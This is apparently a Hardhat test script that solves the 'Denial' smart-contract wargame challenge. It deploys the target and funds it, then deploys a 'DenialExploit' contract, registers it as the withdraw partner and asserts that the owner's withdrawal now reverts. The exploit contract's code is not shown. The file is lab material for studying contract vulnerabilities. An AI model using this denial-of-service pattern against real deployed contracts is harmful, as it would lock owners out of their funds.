import { expect } from "chai";
import { ethers } from "hardhat";

describe.only("Denial", function () {
  it("Should deny the owner from withdrawing", async function () {
    // init
    const [ deployer, owner, player ] = await ethers.getSigners();
    console.log("Deployer address: " + deployer.address);
    console.log("Owner address: " + owner.address);
    
    const contract = await (
      await ethers.getContractFactory("Denial")
    ).deploy();
	await contract.deployTransaction.wait();
    console.log('Denial deployed at: '+ contract.address);    

	// fund contract !!!
	const tx = await player.sendTransaction({
		value: ethers.utils.parseEther("1"),
		to: contract.address
	});
	await tx.wait();

	expect(
		await contract.contractBalance()
	).to.be.above(0);
	
    // hack
    const exploitContract = await (
      await ethers.getContractFactory("DenialExploit")
    ).deploy(contract.address);
    await exploitContract.deployTransaction.wait();
    console.log('DenialExploit deployed at: '+ exploitContract.address);    
    
	// player should be able to withdraw
	await contract.setWithdrawPartner(player.address);
	await expect(
		contract.connect(player).withdraw()
	  ).to.not.be.reverted;

    // become a partner
	await contract.setWithdrawPartner(exploitContract.address);

    // check
    
	await expect(
      contract.connect(owner).withdraw({
		gasLimit: 1_000_000
	  })
    ).to.be.reverted;
	
  });
});
